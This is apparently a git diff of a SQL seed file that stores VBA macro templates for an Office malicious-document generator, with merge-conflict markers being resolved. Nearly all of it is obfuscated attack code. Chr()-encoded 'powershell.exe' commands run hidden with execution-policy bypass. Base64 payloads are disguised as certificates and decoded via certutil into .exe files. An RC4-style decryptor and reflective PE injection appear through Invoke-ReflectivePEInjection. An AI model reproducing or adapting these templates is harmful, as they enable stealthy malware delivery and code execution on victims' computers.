@@ -186,28 +186,22 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', 
 Sub cutil(code As String)
     Dim x As String
     
-<<<<<<< HEAD
     x = "-----BEG" & "IN CER" & "TIFICATE-----"
-=======
     x = "-----BEG" & "IN CER" & "TIFI" & "CATE-----"
->>>>>>> dev
     x = x + vbNewLine
     x = x + code
     x = x + vbNewLine
     x = x + "-----E" & "ND CERTIF" & "ICATE-----"
     
     Dim path As String
-<<<<<<< HEAD
     path = Application.UserLibraryPath & rndname & ".txt"
     expath = Application.UserLibraryPath & rndname & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
-=======
     path = Application.UserLibraryPath & GetRnd & ".txt"
     expath = Application.UserLibraryPath & GetRnd & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemOb" & "ject")
->>>>>>> dev
     Set file = scr.CreateTextFile(path, True)
     file.Write x
     file.Close
@@ -262,11 +256,8 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     x = Replace(x, """", "\""")
     Dim c As String
-<<<<<<< HEAD
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
-=======
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle 1 -command " & Chr(34) & x & Chr(34)
->>>>>>> dev
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
@@ -382,11 +373,8 @@ Public Function crypt(sText As String, sKey As String) As String
         bytSwap = baS(lI)
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
-<<<<<<< HEAD
         crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
-=======
         crypt = crypt & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
->>>>>>> dev
     Next
 End Function
 
@@ -399,26 +387,18 @@ Function phc(ByVal lI As Long, ByVal lJ As Long) As Long
 End Function
 
 Public Function CalcBusiness(sText As String) As String
-    Dim lIdx            As Long
+    Dim lIdx As Long
 
     For lIdx = 1 To Len(sText)
-<<<<<<< HEAD
-        thd = thd & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
-=======
         CalcBusiness = CalcBusiness & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
->>>>>>> dev
     Next
 End Function
 
 Public Function GetBusiness(sText As String) As String
-    Dim lIdx            As Long
+    Dim lIdx As Long
 
     For lIdx = 1 To Len(sText) Step 2
-<<<<<<< HEAD
-        fhd = fhd & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
-=======
         GetBusiness = GetBusiness & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
->>>>>>> dev
     Next
 End Function
 
@@ -428,15 +408,12 @@ End Function
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
 Sub |RANDOMNAME|()
     Dim c As String
-<<<<<<< HEAD
     c = Chr(34) & |PAYLOADTEXT| & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
-=======
     c = |PAYLOADTEXT|
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run (Chr(34) & c & Chr(34)), 0
->>>>>>> dev
 End Sub
 
 ');
@@ -447,11 +424,8 @@ Sub |RANDOMNAME|()
     Dim x,k,p As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
-<<<<<<< HEAD
     p = crc(fhd(CStr(x)), CStr(k))
-=======
     p = crypt(GetBusiness(CStr(x)), CStr(k))
->>>>>>> dev
     p = Replace(p, """", "\""")
     Dim c As String
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
@@ -467,11 +441,8 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
-<<<<<<< HEAD
     pth = Application.UserLibraryPath & rndname & ".txt"
-=======
     pth = Application.UserLibraryPath & GetRnd & ".txt"
->>>>>>> dev
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
     Dim oF As Object
@@ -497,13 +468,10 @@ Sub |RANDOMNAME|()
     Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
     Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
     ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
-<<<<<<< HEAD
     "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
     ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
-=======
     "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
     ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
->>>>>>> dev
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
